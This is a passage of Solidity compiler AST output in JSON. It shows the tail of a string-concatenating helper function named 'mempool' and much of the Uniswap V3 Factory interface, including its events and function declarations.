														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1542,
													"nodeType": "ExpressionStatement",
													"src": "16687:3:0"
												},
												"nodeType": "ForStatement",
												"src": "16657:90:0"
											},
											{
												"body": {
													"id": 1574,
													"nodeType": "Block",
													"src": "16793:56:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1572,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1565,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1520,
																		"src": "16807:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1568,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1567,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "16817:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1566,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1530,
																			"src": "16817:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "16807:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1569,
																		"name": "_valueBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1502,
																		"src": "16824:11:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1571,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1570,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1527,
																		"src": "16836:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "16824:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "16807:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1573,
															"nodeType": "ExpressionStatement",
															"src": "16807:31:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1561,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1558,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1527,
														"src": "16766:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1559,
															"name": "_valueBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1502,
															"src": "16768:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1560,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "16768:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "16766:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1575,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1556,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1554,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1527,
															"src": "16761:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1555,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "16763:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "16761:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1557,
													"nodeType": "ExpressionStatement",
													"src": "16761:3:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1563,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "16788:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 1562,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1527,
															"src": "16788:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1564,
													"nodeType": "ExpressionStatement",
													"src": "16788:3:0"
												},
												"nodeType": "ForStatement",
												"src": "16757:92:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1578,
															"name": "_newValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1520,
															"src": "16873:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1577,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "16866:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1576,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "16866:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1579,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16866:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1493,
												"id": 1580,
												"nodeType": "Return",
												"src": "16859:24:0"
											}
										]
									},
									"documentation": null,
									"id": 1582,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1490,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1487,
												"mutability": "mutable",
												"name": "_base",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1582,
												"src": "16296:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1486,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16296:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1489,
												"mutability": "mutable",
												"name": "_value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1582,
												"src": "16317:20:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1488,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16317:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16295:43:0"
									},
									"returnParameters": {
										"id": 1493,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1492,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1582,
												"src": "16362:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1491,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16362:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16361:15:0"
									},
									"scope": 1583,
									"src": "16279:611:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 1584,
							"src": "516:16378:0"
						}
					],
					"src": "31:16865:0"
				},
				"id": 0
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
					"exportedSymbols": {
						"IUniswapV3Factory": [
							1666
						]
					},
					"id": 1667,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1585,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1586,
								"nodeType": "StructuredDocumentation",
								"src": "71:163:1",
								"text": "@title The interface for the Uniswap V3 Factory\n @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees"
							},
							"fullyImplemented": false,
							"id": 1666,
							"linearizedBaseContracts": [
								1666
							],
							"name": "IUniswapV3Factory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 1587,
										"nodeType": "StructuredDocumentation",
										"src": "268:185:1",
										"text": "@notice Emitted when the owner of the factory is changed\n @param oldOwner The owner before the owner was changed\n @param newOwner The owner after the owner was changed"
									},
									"id": 1593,
									"name": "OwnerChanged",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1592,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1589,
												"indexed": true,
												"mutability": "mutable",
												"name": "oldOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1593,
												"src": "477:24:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1588,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "477:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1591,
												"indexed": true,
												"mutability": "mutable",
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1593,
												"src": "503:24:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1590,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "503:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "476:52:1"
									},
									"src": "458:71:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1594,
										"nodeType": "StructuredDocumentation",
										"src": "535:421:1",
										"text": "@notice Emitted when a pool is created\n @param token0 The first token of the pool by address sort order\n @param token1 The second token of the pool by address sort order\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks\n @param pool The address of the created pool"
									},
									"id": 1606,
									"name": "PoolCreated",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1605,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1596,
												"indexed": true,
												"mutability": "mutable",
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1606,
												"src": "988:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1595,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "988:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1598,
												"indexed": true,
												"mutability": "mutable",
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1606,
												"src": "1020:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1597,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1020:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1600,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1606,
												"src": "1052:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1599,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1052:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1602,
												"indexed": false,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1606,
												"src": "1080:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1601,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1080:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1604,
												"indexed": false,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1606,
												"src": "1107:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1603,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1107:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "978:147:1"
									},
									"src": "961:165:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1607,
										"nodeType": "StructuredDocumentation",
										"src": "1132:275:1",
										"text": "@notice Emitted when a new fee amount is enabled for pool creation via the factory\n @param fee The enabled fee, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee"
									},
									"id": 1613,
									"name": "FeeAmountEnabled",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1612,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1609,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1613,
												"src": "1435:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1608,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1435:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1611,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1613,
												"src": "1455:25:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1610,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1455:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1434:47:1"
									},
									"src": "1412:70:1"
								},
								{
									"body": null,
									"documentation": {
										"id": 1614,
										"nodeType": "StructuredDocumentation",
										"src": "1488:163:1",
										"text": "@notice Returns the current owner of the factory\n @dev Can be changed by the current owner via setOwner\n @return The address of the factory owner"
									},
									"functionSelector": "8da5cb5b",
									"id": 1619,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "owner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1615,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1670:2:1"
									},
									"returnParameters": {
										"id": 1618,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1617,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1619,
												"src": "1696:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1616,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1696:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1695:9:1"
									},
									"scope": 1666,
									"src": "1656:49:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1620,
										"nodeType": "StructuredDocumentation",
										"src": "1711:348:1",
										"text": "@notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n @return The tick spacing"
									},
									"functionSelector": "22afcccb",
									"id": 1627,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeAmountTickSpacing",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1623,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1622,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1627,
												"src": "2094:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1621,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2094:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2093:12:1"
									},
									"returnParameters": {
										"id": 1626,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1625,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1627,
												"src": "2129:5:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1624,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2129:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2128:7:1"
									},
									"scope": 1666,
									"src": "2064:72:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1628,
										"nodeType": "StructuredDocumentation",
										"src": "2142:471:1",
										"text": "@notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n @param tokenA The contract address of either token0 or token1\n @param tokenB The contract address of the other token\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @return pool The pool address"
									},
									"functionSelector": "1698ee82",
									"id": 1639,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1635,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1630,
												"mutability": "mutable",
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1639,
												"src": "2644:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1629,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2644:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1632,
												"mutability": "mutable",
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1639,
												"src": "2668:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1631,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2668:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1634,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1639,
												"src": "2692:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1633,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2692:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2634:74:1"
									},
									"returnParameters": {
										"id": 1638,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1637,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1639,
												"src": "2732:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1636,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2732:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2731:14:1"
									},
									"scope": 1666,
									"src": "2618:128:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1640,
										"nodeType": "StructuredDocumentation",
										"src": "2752:554:1",
										"text": "@notice Creates a pool for the given two tokens and fee\n @param tokenA One of the two tokens in the desired pool\n @param tokenB The other of the two tokens in the desired pool\n @param fee The desired fee for the pool\n @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved\n from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments\n are invalid.\n @return pool The address of the newly created pool"
									},
									"functionSelector": "a1671295",
									"id": 1651,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "createPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1647,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1642,
												"mutability": "mutable",
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1651,
												"src": "3340:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1641,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3340:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1644,
												"mutability": "mutable",
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1651,
												"src": "3364:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1643,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3364:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1646,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1651,
												"src": "3388:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1645,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "3388:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3330:74:1"
									},
									"returnParameters": {
										"id": 1650,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1649,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1651,
												"src": "3423:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1648,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3423:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3422:14:1"
									},
									"scope": 1666,
									"src": "3311:126:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1652,
										"nodeType": "StructuredDocumentation",
										"src": "3443:144:1",
										"text": "@notice Updates the owner of the factory\n @dev Must be called by the current owner\n @param _owner The new owner of the factory"
									},
									"functionSelector": "13af4035",
									"id": 1657,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "setOwner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1655,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1654,
												"mutability": "mutable",
												"name": "_owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1657,
												"src": "3610:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1653,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3610:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3609:16:1"
									},
									"returnParameters": {
										"id": 1656,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3634:0:1"
									},
									"scope": 1666,
									"src": "3592:43:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1658,
										"nodeType": "StructuredDocumentation",
										"src": "3641:326:1",
										"text": "@notice Enables a fee amount with the given tickSpacing\n @dev Fee amounts may never be removed once enabled\n @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)\n @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount"
									},
